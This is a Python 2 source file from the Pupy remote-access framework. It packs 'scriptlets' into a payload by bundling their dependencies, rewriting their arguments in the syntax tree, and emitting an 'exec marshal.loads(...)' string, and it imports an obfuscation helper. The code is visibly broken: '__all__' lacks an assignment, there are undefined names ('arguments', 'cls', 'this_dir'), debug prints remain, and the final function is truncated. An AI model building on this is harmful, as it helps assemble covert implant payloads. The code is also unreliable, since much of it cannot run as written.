#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

__all__ [
  'ScriptletArgumentError', 'Scriptlet',
  'ScriptletsPacker', 'load_scriptlets'
]

from pupylib import getLogger
from pupylib.payloads  import dependencies
from pupylib.PupyCompile import Compiler
from pupylib.utils.obfuscate import compress_encode_obfs

from ast import (
    parse,
    TryExcept, Module, FunctionDef, Num, Name, Str,
    NodeTransformer
)
from os import path, listdir

ROOT = path.abspath(path.join(path.dirname(__file__), '..', 'packages'))

logger = getLogger('scriptlets')

WRAPPING_TEMPLATE = '''
{scriptlet}_logger = logger.getChild("{scriptlet}")

try:
   # SCRIPTLET BODY GOES HERE
   {scriptlet}_main()
except Exception, e:
   {scriptlet}_logger.exception(e)
'''

class AstCompiler(Compiler):
    def __init__(self):
        self._source_ast = None
        self._main = False
        self._docstrings = False
        self._source_ast = False

        NodeTransformer.__init__(self)

    def add_ast(self, ast):
        if not self._source_ast:
            self._source_ast = ast
        else:
            self._source_ast.body.extend(ast.body)

class ScriptletArgumentError(Exception):
    pass

class Scriptlet(object):

    __slots__ = (
        'description', 'dependencies', 'arguments', 'filepath'
    )

    def __init__(self, description, dependencies, filepath):
        self.description = description
        self.dependencies = dependencies
        self.filepath = filepath
        self.arguments = arguments

    def get_help(self):
        res=("\tdescription : %s\n"%self.description)
        if cls.arguments:
            res+=("\targuments   : \n")
            for arg, desc in self.arguments.iteritems():
                res+="\t\t\t{:<10} : {}\n".format(arg, desc)
        else:
            res+=("\targuments   : \n")
            res+="\t\t\t{:<10}\n".format("no arguments")
        return res


class ScriptletsPacker(object):
    def __init__(self, os=None, arch=None):
        self.scriptlets = {}
        self.os = os or 'all'
        self.arch = arch

    def add_scriptlet(self, scriptlet, kwargs={}):
        self.scriptlets[scriptlet] = kwargs

    def pack(self):
        compiler = AstCompiler()

        requirements = set()

        for scriptlet in self.scriptlets:
            if type(scriptlet.dependencies) == dict:
                for dependency in scriptlet.dependencies.get('all', []):
                    requirements.add(dependency)

                for dependency in scriptlet.dependencies.get(self.os, []):
                    requirements.add(dependency)
            else:
                for dependency in scriptlet.dependencies:
                    requirements.add(dependency)

        if requirements:
            compiler.add_ast(
                parse('\n'.join([
                    'import pupyimporter',
                    dependencies.importer(requirements, os=self.os)
                ]) +'\n'))

        for scriptlet, kwargs in self.scriptlets.iteritems():
            template = WRAPPING_TEMPLATE.format(
                scriptlet=scriptlet.__name__)
            template_ast = parse(template)

            print "SCRIPTLET", scriptlet
            print "SCRIPTLET PATH", scriptlet.__path__

            scriptlet_ast = None

            with open(path.join(scriptlet.__path__[0], 'scriptlet.py')) as scriptlet_src:
                scriptlet_ast = parse(scriptlet_src.read())

            # Bind args
            # There should be top level function main
            for item in scriptlet_ast.body:
                if type(item) == FunctionDef and item.name == 'main':
                    item.name = scriptlet.__name__ + '_main'
                    for arg, value in zip(item.args.args, item.args.defaults):
                        if arg.id in kwargs:
                            default = kwargs[arg.id]
                            vtype = type(value)
                            if vtype == Num:
                                value.n = int(default)
                            elif vtype == Str:
                                value.s = default
                            elif vtype == Name:
                                value.id = repr(default)

            # Wrap in try/except
            for item in template_ast.body:
                if type(item) == TryExcept:
                    scriptlet_ast.body.extend(item.body)
                    item.body = scriptlet_ast.body
                    print "FOUND BODY, NEW:", item.body
                    break

            compiler.add_ast(template_ast)

        return 'exec marshal.loads({})'.format(
            repr(compiler.compile('scriptlets', raw=True)))

def parse_meta(filepath):
    filepath = path.join(this_dir, filename)
    filecontent = None

    with open(filepath) as content:
        filecontent = content.read()

    fileast = None

    try:
        fileast = parse(filecontent)
    except Exception, e:
        logger.exception(e)
        return None, None

    docstrings = []
    dependencies = {}
    arguments = {}

def load_scriptlets():
    this_dir = path.dirname(__file__)

    for filename in listdir(this_dir):
        if not filename.endswith('.py'):
            continue
